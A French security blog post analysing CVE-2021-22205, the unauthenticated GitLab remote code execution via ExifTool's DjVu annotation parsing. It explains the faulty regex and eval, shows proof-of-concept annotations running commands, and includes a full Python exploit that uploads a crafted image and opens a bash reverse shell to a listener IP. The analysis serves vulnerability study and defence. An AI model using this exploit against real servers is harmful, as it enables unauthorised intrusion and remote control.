<p>En avril dernier, Gitlab a fait publié un <a href="https://about.gitlab.com/releases/2021/04/14/security-release-gitlab-13-10-3-released/" target="_blank" rel="noreferrer noopener">correctif de sécurité</a> concernant une vulnérabilité d&#8217;exécution de code à distance non authentifiée sur son application web. Particulièrement critique, cette vulnérabilité (<a href="https://nvd.nist.gov/vuln/detail/CVE-2021-22205" target="_blank" rel="noreferrer noopener">CVE-2021-22205</a>) a fait l&#8217;objet d&#8217;un score CVSS de 9.9. Plus récemment, des exploitations <em>in the wild</em> <a href="https://security.humanativaspa.it/gitlab-ce-cve-2021-22205-in-the-wild/" target="_blank" rel="noreferrer noopener">ont été identifiées</a> sur des instances exposées.</p>



<p>Plusieurs analyses techniques ont été publiées et nous nous sommes penchés sur cette vulnérabilité dans le cadre de notre travail de veille technique.</p>



<h3><span class="has-inline-color has-primary-color">Fonctionnement général de la vulnérabilité</span></h3>



<p>La vulnérabilité est présente dans la librairie ExifTool, qui est utilisée par Gitlab (<a href="https://nvd.nist.gov/vuln/detail/CVE-2021-22204" target="_blank" rel="noreferrer noopener">CVE-2021-22204</a>). Lors du téléchargement de fichiers images, GitLab Workhorse transmet tous les fichiers avec les extensions jpg|jpeg|tiff à ExifTool afin de supprimer toutes les balises qui ne figurent pas sur une liste blanche.</p>



<p>Néanmoins, ExifTool ignorera l&#8217;extension du fichier et essaiera de déterminer la nature du fichier sur la base de son contenu. Cela permet de leurrer le système de validation, et d&#8217;exécuter d&#8217;autres analyseurs ExifTool que ceux prévus initialement (JPEG et TIFF) : il suffit de renommer un fichier d&#8217;un autre format en .jpg|.jpeg|.tiff pour qu&#8217;il soit envoyé à ExifTool. L&#8217;un de ces formats pris en charge est le format DjVu.</p>



<p>Lors de l&#8217;analyse de l&#8217;annotation DjVu, les tokens sont évalués pour &#8220;convertir les séquences d&#8217;échappement C&#8221;, qui représentent une menace de sécurité. Une validation est présente, afin de s&#8217;assurer que tout est correctement échappé. Malheureusement, l&#8217;expression régulière utilisée pour réaliser cette validation n&#8217;est pas correctement écrite et il est possible de la contourner grâce à un backslash suivi d&#8217;un retour à la ligne, ouvrant la possibilité d&#8217;insérer un code Perl à la suite, qui sera évalué (et donc exécuté).</p>



<p>Versions impactées</p>



<ul class="has-normal-font-size"><li>Gitlab CE/EE &lt; 13.10.3</li><li>Gitlab CE/EE &lt; 13.9.6</li><li>Gitlab CE/EE &lt; 13.8.8</li></ul>



<h3><span class="has-inline-color has-primary-color">Détails technique : CVE-2021-22204</span></h3>



<p>La version vulnérable de Exiftool est la <a href="https://github.com/exiftool/exiftool/releases/tag/12.23">version 12.23</a>.</p>



<h5><a href="#exiftool"></a>Exiftool</h5>



<p class="is-style-default">ExifTool est un logiciel libre et gratuit pour la lecture, l&#8217;écriture et la manipulation des métadonnées d&#8217;images, d&#8217;audio, de vidéo et de PDF. Il est indépendant de la plateforme utilisée, disponible à la fois comme une bibliothèque Perl (Image::ExifTool) et une application en ligne de commande. ExifTool est couramment incorporé dans différents types de flux de travail numériques et supporte de nombreux types de métadonnées, notamment Exif, IPTC, XMP, JFIF, GeoTIFF, ICC Profile, Photoshop IRB, FlashPix, AFCP et ID3, ainsi que les formats de métadonnées spécifiques au fabricant de nombreux appareils photo numériques.</p>



<h5><a href="#djvu"></a>DjVu</h5>



<p>Djvu est un format de fichier conçu initialement pour stocker des documents numérisés, en particulier ceux contenant une combinaison de texte, d&#8217;image en couleur et d&#8217;image vectorielle. Cela permet de stocker des images lisibles et de haute qualité dans un minimum d&#8217;espace, ce qui permet de les rendre disponibles sur le web.</p>



<h5><a href="#explication-de-la-vuln%C3%A9rabilit%C3%A9-djvu"></a>Explication de la vulnérabilité DjVu</h5>



<p>La vulnérabilité survient lorsque Exiftool tente d&#8217;analyser le type de fichier DjVu, plus précisément les metadatas dans la structure du fichier.</p>



<p>C&#8217;est la fonction <code>ParseAnt</code> du fichier <code>exiftool-12.23/lib/Image/ExifTool/DjVu.pm</code> qui permet d&#8217;exécuter du code arbitraire.</p>



<p>La fonction permet de <em>parser</em> les annotations <code>s-expression</code> d&#8217;une image. Pour cela, une expression régulière échappe les caractères spéciaux avant de passer la chaîne à <code>qq</code> qui sera ensuite interprété avec <code>eval</code>. Ce mécanisme a été mis en place pour supporter les séquences d&#8217;échappement C, qui sont similaires en Perl.</p>



<pre class="wp-block-code has-normal-font-size"><code lang="python" class="language-python">
#------------------------------------------------------------------------------
# Parse DjVu annotation "s-expression" syntax (recursively)
# Inputs: 0) data ref (with pos($$dataPt) set to start of annotation)
# Returns: reference to list of tokens/references, or undef if no tokens,
#          and the position in $$dataPt is set to end of last token
# Notes: The DjVu annotation syntax is not well documented, so I make
#        a number of assumptions here!
sub ParseAnt($)
{
  [...]
            $tok = '';
            for (;;) {
                # get string up to the next quotation mark
                # this doesn't work in perl 5.6.2! grrrr
                # last Tok unless $$dataPt =~ /(.*?)"/sg;
                # $tok .= $1;
                my $pos = pos($$dataPt);
                last Tok unless $$dataPt =~ /"/sg;
                $tok .= substr($$dataPt, $pos, pos($$dataPt)-1-$pos);
                # we're good unless quote was escaped by odd number of backslashes
<span style="background-color:#E9E9E9" class="background-color">                last unless $tok =~ /(\\+)$/ and length($1) &amp; 0x01;</span>
                $tok .= '"';    # quote is part of the string
            }
            # must protect unescaped "$" and "@" symbols, and "\" at end of string
            $tok =~ s{\\(.)|([\$\@]|\\$)}{'\\'.($2 || $1)}sge;
            # convert C escape sequences (allowed in quoted text)
            $tok = eval qq{"$tok"};
  [...]
}
</code></pre>



<p>Si on fournit la chaîne suivante:</p>



<pre class="wp-block-code has-normal-font-size"><code lang="python" class="language-python">
"a\
""
</code></pre>



<p>Le deuxième <code>"</code> n&#8217;est pas échappé car dans la regex <code>$tok =~ /(\\\+)$/</code>, le caractère <code>$</code> correspond à la fin d&#8217;une chaîne de caractères, mais correspond aussi à la fin d&#8217;une chaîne de caractères avant un retour chariot. Le code l&#8217;interprète ainsi comme un échappement du guillemet (sur la ligne suivante), alors qu&#8217;il échappe en réalité le retour chariot.</p>



<p>La fonction est utilisée pour parser les metadata d&#8217;une image, le format des metadata est le suivant: <code>(metadata (Author "authorName"))</code>.</p>



<p>Si on crée un tag metadata avec du code Perl en se basant sur le mauvais échappement des caractères on pourra exécuter le code contenu dans la chaîne qui sera passée à la fonction <code>eval</code>.</p>



<pre class="wp-block-code has-normal-font-size"><code lang="python" class="language-python">
&gt; vim exploit_djvu
(metadata
    (Author "\
" . return `date`; #")
)
&gt; djvumake exploit.djvu INFO=0,0 BGjp=/dev/null ANTa=exploit_djvu
&gt; exiftool exploit.djvu
ExifTool Version Number         : 12.23
File Name                       : exploit.djvu
Directory                       : ..
File Size                       : 100 bytes
File Modification Date/Time     : 2021:11:12 12:44:18+01:00
File Access Date/Time           : 2021:11:12 12:44:20+01:00
File Inode Change Date/Time     : 2021:11:12 12:44:18+01:00
File Permissions                : -rw-rw-r--
File Type                       : DJVU
File Type Extension             : djvu
MIME Type                       : image/vnd.djvu
Image Width                     : 0
Image Height                    : 0
DjVu Version                    : 0.24
Spatial Resolution              : 300
Gamma                           : 2.2
Orientation                     : Horizontal (normal)
<span style="background-color:#E9E9E9" class="background-color">Author                          : ven. 12 nov. 2021 12:44:20 CET.</span>
Image Size                      : 0x0
Megapixels                      : 0.000000
</code></pre>



<p>La metadata <code>Author</code> affiche bien la date.</p>



<p>On peut également exécuter des commandes système avec la fonction Perl <code>qx</code>:</p>



<pre class="wp-block-code has-normal-font-size"><code lang="python" class="language-python">
(metadata
    (Author "\
" . qx{pwd}; #")
)
</code></pre>



<p>On obtient alors:</p>



<pre class="wp-block-code has-normal-font-size"><code lang="python" class="language-python">
ExifTool Version Number         : 12.23
File Name                       : exploit.djvu
Directory                       : ..
File Size                       : 94 bytes
File Modification Date/Time     : 2021:11:12 16:17:08+01:00
File Access Date/Time           : 2021:11:12 16:17:09+01:00
File Inode Change Date/Time     : 2021:11:12 16:17:08+01:00
File Permissions                : -rw-rw-r--
File Type                       : DJVU
File Type Extension             : djvu
MIME Type                       : image/vnd.djvu
Image Width                     : 0
Image Height                    : 0
DjVu Version                    : 0.24
Spatial Resolution              : 300
Gamma                           : 2.2
Orientation                     : Horizontal (normal)
<span style="background-color:#E9E9E9" class="background-color">Author                          : ./home/magnussen/CVE-2021-22205/</span>
Image Size                      : 0x0
Megapixels                      : 0.000000
</code></pre>



<p>Il est possible d&#8217;appeler le module DjVu et d&#8217;exécuter le payload avec d&#8217;autres formats de fichiers tant que ceux-ci passent par la fonction <code>ExtractInfo</code>. Par exemple dans le format TIFF (pour des images TIFF, JPG, PNG, etc.), le tag <code>HasselbladExif</code> va permettre d&#8217;appeler la fonction <code>ExtractInfo</code> et d&#8217;atteindre la fonction <code>ParseAnt</code>. Les autres types de fichiers permettant cette exécution sont:</p>



<ul class="has-normal-font-size"><li>ZIP</li><li>PDF</li><li>AVI</li><li>MOV/MP4</li></ul>



<h3><span class="has-inline-color has-primary-color">Détails technique : CVE-2021-22205</span></h3>



<p>La vulnérabilité dans Gitlab provient du fait qu&#8217;un utilisateur n&#8217;a pas besoin d&#8217;être authentifié pour transmettre un fichier à Exiftool. En effet, la fonction <code>HandleFileUploads</code> dans <a href="https://gitlab.com/gitlab-org/gitlab/-/blob/2a76d851e6502b0de876cbf3a4ca4a5ca9f69d82/workhorse/internal/upload/uploads.go">uploads.go</a> est appelée dans un contexte <code>PreAuthorizeHandler</code> qui ne nécessite pas de fournir d&#8217;authentication. Il n&#8217;est pas nécessaire de fournir d&#8217;authentification, ni de token CSRF, ni de endpoint HTTP valide.</p>



<p>On peut donc forger un fichier JPEG qui contiendra le tag <code>HasselbladExif</code> et qui permettra d&#8217;exploiter la CVE-2021-22204.</p>



<p>Si on exécute le script python ci-dessous on obtient un reverse shell.</p>



<pre class="wp-block-code has-normal-font-size"><code lang="python" class="language-python">
import requests

headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:60.0) Gecko/20110101 Firefox/60.0", "Connection": "close", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5", "Accept-Encoding": "gzip, deflate"}

payload = "\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.jpg\"\r\nContent-Type: image/jpeg\r\n\r\nAT&amp;TFORM\x00\x00\x03\xafDJVMDIRM\x00\x00\x00.\x81\x00\x02\x00\x00\x00F\x00\x00\x00\xac\xff\xff\xde\xbf\x99 !\xc8\x91N\xeb\x0c\x07\x1f\xd2\xda\x88\xe8k\xe6D\x0f,q\x02\xeeI\xd3n\x95\xbd\xa2\xc3\"?FORM\x00\x00\x00^DJVUINFO\x00\x00\x00\n\x00\x08\x00\x08\x18\x00d\x00\x16\x00INCL\x00\x00\x00\x0fshared_anno.iff\x00BG44\x00\x00\x00\x11\x00J\x01\x02\x00\x08\x00\x08\x8a\xe6\xe1\xb17\xd9*\x89\x00BG44\x00\x00\x00\x04\x01\x0f\xf9\x9fBG44\x00\x00\x00\x02\x02\nFORM\x00\x00\x03\x07DJVIANTa\x00\x00\x01P(metadata\n\t(Copyright \"\\\n\" . qx{{{command}}} . \\\n\" b \") )                                                                                                                                                                                                                                                                                                                                                                                                                                     \n\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5--\r\n\r\n".format(command="echo 'bash -i &gt;&amp; /dev/tcp/192.168.1.185/7777 0&gt;&amp;1' &gt; /tmp/DyDxngRt &amp;&amp; /bin/bash /tmp/DyDxngRt &amp;&amp; rm /tmp/DyDxngRt")

print(requests.post('http://192.168.1.156/test1337', headers=headers, data=payload))

</code></pre>



<h3><span style="color:#ED1C24" class="color"><a href="#patch"></a>Patch</span></h3>



<p>Gitlab n&#8217;a pas corrigé la manière dont il est possible d&#8217;accéder à ExifTool sans authentification. Cependant ils ont ajouté des validations permettant de s&#8217;assurer que les images soient bien des TIFF ou des JPEG, notamment avec les fonctions <code>isTIFF</code> et <code>isJPEG</code>. Une image TIFF est maintenant entièrement décodée pour vérifier sa validité et une image JPEG est passée à la fonction <code>DetectContentType</code> du module HTTP Go.</p>



<p>Par ailleurs, Gitlab embarque maintenant une version patchée contre la CVE-2021-22204 de Exiftool.</p>



<h3><span style="color:#ED1C24" class="color">Sources</span></h3>



<ul class="has-normal-font-size"><li><a href="https://dl.packetstormsecurity.net/papers/general/exiftool.pdf">https://dl.packetstormsecurity.net/papers/general/exiftool.pdf</a></li><li><a href="https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/">https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/</a></li><li><a href="https://blogs.blackberry.com/en/2021/06/from-fix-to-exploit-arbitrary-code-execution-for-cve-2021-22204-in-exiftool">https://blogs.blackberry.com/en/2021/06/from-fix-to-exploit-arbitrary-code-execution-for-cve-2021-22204-in-exiftool</a></li><li><a href="https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html">https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html</a></li><li><a href="https://hackerone.com/reports/1154542">https://hackerone.com/reports/1154542</a></li><li><a href="https://attackerkb.com/topics/D41jRUXCiJ/cve-2021-22205/rapid7-analysis?referrer=blog">https://attackerkb.com/topics/D41jRUXCiJ/cve-2021-22205/rapid7-analysis?referrer=blog</a></li><li><a href="https://pentest-tools.com/blog/detect-gitlab-cve-2021-22205/">https://pentest-tools.com/blog/detect-gitlab-cve-2021-22205/</a></li></ul>



<h2><a href="#sources"></a></h2>
<p>The post <a rel="nofollow" href="https://www.acceis.fr/analyse-de-la-vulnerabilite-cve-2021-22205/">Analyse de la vulnérabilité CVE-2021-22205</a> appeared first on <a rel="nofollow" href="https://www.acceis.fr">ACCEIS</a>.</p>
]]></content:encoded>
					
		
		
			</item>
	</channel>
</rss>
